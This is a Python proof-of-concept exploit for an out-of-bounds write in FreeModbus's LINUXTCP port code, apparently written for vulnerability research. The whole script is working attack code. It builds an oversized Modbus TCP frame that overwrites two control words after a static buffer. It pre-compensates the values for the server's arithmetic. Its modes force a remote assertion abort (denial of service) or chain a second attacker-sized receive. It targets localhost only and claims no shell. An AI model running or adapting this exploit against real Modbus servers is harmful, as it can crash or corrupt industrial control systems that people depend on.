#!/usr/bin/env python3
"""
CVE-2026-71263 — FreeModbus LINUXTCP OOB write (demo/LINUXTCP/port/porttcp.c)
Local, 127.0.0.1:502, NON-ASAN build (assert ACTIVE).

This PoC turns the OOB write in xMBPortTCPPool() into a *demonstrated* primitive.
It does NOT claim a shell: on this build the intended function-pointer chain is
blocked (see EXPLOIT-NOTES.md). What is demonstrated and gdb-verified:

  1. Arbitrary 16-bit write to the two .bss control words that immediately
     follow the 263-byte static `aucTCPBuf`:
        usTCPBufPos          @ aucTCPBuf + 0x108  (next recv() base offset)
        usTCPFrameBytesLeft  @ aucTCPBuf + 0x10a  (next recv() length)
  2. The post-recv arithmetic (usTCPBufPos += ret; usTCPFrameBytesLeft -= ret)
     is compensated so the *final* values are the attacker's target.
  3. Depending on the chosen values the attacker either:
       --abort : places usTCPBufPos = 0x140 (=peMBFrameSendCur offset) -> the
                 live assert(porttcp.c:287) fires -> deterministic remote abort
                 of the server (DoS). [same frame the parent's chain used]
       --escape: wraps usTCPBufPos to 0 (skips the length-check) and sizes the
                 NEXT recv with the attacker-chosen usTCPFrameBytesLeft,
                 demonstrating the corrupted state directly controls a
                 subsequent recv() (chained arbitrary write, bounded < 0x110).
       default(no flag): legal Pos -> frame completes -> normal Modbus reply
                 (proves the same frame shape is benign when Pos is legal).

Everything runs against 127.0.0.1:502 only. Kill all listeners you start.
"""

import argparse
import socket
import time

HOST = "127.0.0.1"
PORT = 502

# .bss offsets relative to aucTCPBuf (verified via nm on the non-ASAN binary)
OFF_BUF            = 0x000
OFF_BUFFER_END     = 0x107   # first byte past the 263-byte buffer (pad)
OFF_POS            = 0x108   # usTCPBufPos
OFF_BYTESLEFT      = 0x10a   # usTCPFrameBytesLeft
OFF_PE_SEND_CUR    = 0x140   # peMBFrameSendCur (send reply fn ptr) - NOT writable here
OFF_BUF_SIZE       = 263


def build_frame(uslength, pos_target, bl_target, tid=0x4141):
    """
    Build the overflow frame (length uslength, frame total 6+uslength bytes).

    The pool receives header (7B) first, then (uslength-MB_TCP_UID-... ) bytes in
    a second recv starting at buffer offset 7. With uslength=264 the second recv
    writes buffer offsets 7..269, so the frame's own bytes 264..267 land on the
    two control words. After that recv the port applies:
        usTCPBufPos        += ret   (ret=263)
        usTCPFrameBytesLeft -= ret
    so we pre-compensate:
        pos_target  = (usTCPBufPos_final  - 263)
        bl_target   = (usTCPFrameBytesLeft_final + 263)
    """
    frame = bytearray(6 + uslength)
    frame[0:2] = tid.to_bytes(2, "big")
    frame[2:4] = (0).to_bytes(2, "big")
    frame[4:6] = uslength.to_bytes(2, "big")          # MBAP Length (big-endian)
    frame[6] = 0x01                                    # UID
    frame[7] = 0x03                                    # FC = read holding regs
    frame[8:10] = (0x07D0).to_bytes(2, "big")          # start addr 2000
    frame[10:12] = (4).to_bytes(2, "big")              # qty 4
    for i in range(12, OFF_BUF_SIZE):
        frame[i] = 0x41                                # padding (in-buffer)
    frame[OFF_BUF_SIZE] = 0x43                         # pad byte at buffer end (263)
    # tail bytes that overflow into the two control words:
    frame[264:266] = (pos_target & 0xFFFF).to_bytes(2, "little")
    frame[266:268] = (bl_target & 0xFFFF).to_bytes(2, "little")
    frame[268] = 0x42                                # pad at offset 268
    frame[269] = 0x42                                # pad at offset 269
    return bytes(frame)


def one_shot(name, payload, sends_after=(), timeout=3.0, quiet=False):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((HOST, PORT))
    s.sendall(payload)
    time.sleep(0.3)
    for chunk in sends_after:
        s.sendall(chunk)
        time.sleep(0.2)
    out = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass
    s.close()
    if not quiet:
        print(f"[{name}] sent {len(payload)}B, got {len(out)}B: {out.hex()}")
    return out


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--dry-run", action="store_true",
                    help="print the exact frame bytes that would be sent, then exit")
    ap.add_argument("--target-ptr", type=lambda x: int(x, 0), default=OFF_POS,
                    help=".bss byte offset (relative to aucTCPBuf) to write a 16-bit "
                         "value into. Only the two control words are reachable: "
                         "0x108 (usTCPBufPos) and 0x10a (usTCPFrameBytesLeft). "
                         "Targets >= 0x110 (function pointers) are NOT reachable "
                         "on this build (see EXPLOIT-NOTES.md).")
    ap.add_argument("--write-value", type=lambda x: int(x, 0), default=0x0140,
                    help="desired FINAL 16-bit value at --target-ptr after the "
                         "post-recv arithmetic (POSITIVE logic, e.g. 0x140 = 320).")
    ap.add_argument("--uslength", type=int, default=264,
                    help="MBAP Length used to drive the overflow (default 264; "
                         "guard requires <= 264).")
    ap.add_argument("--mode", choices=["abort", "escape", "legal", "custom"],
                    default="abort",
                    help="abort(default)|escape|legal|custom")
    args = ap.parse_args()

    # ---- derive the two control-word writes from --target-ptr/--write-value ----
    # usTCPFrameBytesLeft final value is kept small so it stays below the
    # MB_TCP_BUF_SIZE guard (263) at the next loop iteration.
    pos_final = args.write_value if args.target_ptr == OFF_POS else 0x0000
    bl_final = 0x0003
    if args.target_ptr in (OFF_POS, OFF_BYTESLEFT):
        if args.target_ptr == OFF_BYTESLEFT:
            bl_final = args.write_value
    else:
        print(f"[!] target 0x{args.target_ptr:03x} not reachable: only "
              f"0x108/0x10a lie inside the writable overflow window "
              f"(max write offset 0x{0x10d:03x}). See EXPLOIT-NOTES.md.")
        raise SystemExit(2)

    pos_comp = (pos_final - (args.uslength - 1)) & 0xFFFF
    bl_comp = (bl_final + (args.uslength - 1)) & 0xFFFF

    if args.mode == "escape":
        pos_comp = 0xFEF9        # -> Pos wraps to 0, skips length check
        bl_comp = 263 + 263      # -> BytesLeft = 263 after -=ret (max legal)
    elif args.mode == "legal":
        pos_comp = 7             # -> Pos=270, completes normally
        bl_comp = 263 + 263
    elif args.mode == "abort":
        pass                     # use --target-ptr/--write-value defaults -> Pos 0x140

    frame = build_frame(args.uslength, pos_comp, bl_comp)
    if args.dry_run:
        print(f"uslength      = {args.uslength}")
        print(f"target-ptr    = 0x{args.target_ptr:03x}  (bss offset from aucTCPBuf)")
        print(f"write-value   = 0x{args.write_value:04x}  (desired final 16-bit value)")
        print(f"pos_comp(payload @0x108) = 0x{pos_comp:04x}  -> final usTCPBufPos = "
              f"0x{((pos_comp + (args.uslength-1)) & 0xFFFF):04x}")
        print(f"bl_comp(payload @0x10a)  = 0x{bl_comp:04x}  -> final usTCPFrameBytesLeft = "
              f"0x{((bl_comp - (args.uslength-1)) & 0xFFFF):04x}")
        print(f"frame = {frame.hex()}")
        return

    print(f"[*] mode={args.mode} sending {len(frame)}B overflow frame to {HOST}:{PORT}")
    if args.mode == "escape":
        # feed a second frame that the corrupted BytesLeft(263) will consume.
        # MUST be concatenated in one TCP segment: the server's 50ms idle-timeout
        # closes the client if we wait between sends.
        f2 = bytearray(263)
        f2[0:2] = (0x4242).to_bytes(2, "big")
        f2[2:4] = (0).to_bytes(2, "big")
        f2[4:6] = (0x0101).to_bytes(2, "big")   # usLength=257 -> 6+257=263 == Pos
        f2[6] = 0x01
        f2[7] = 0x03
        f2[8:10] = (0x07D0).to_bytes(2, "big")
        f2[10:12] = (4).to_bytes(2, "big")
        for i in range(12, 263):
            f2[i] = 0x44
        frame = frame + bytes(f2)
    one_shot(args.mode, frame)
    print("[*] done")


if __name__ == "__main__":
    main()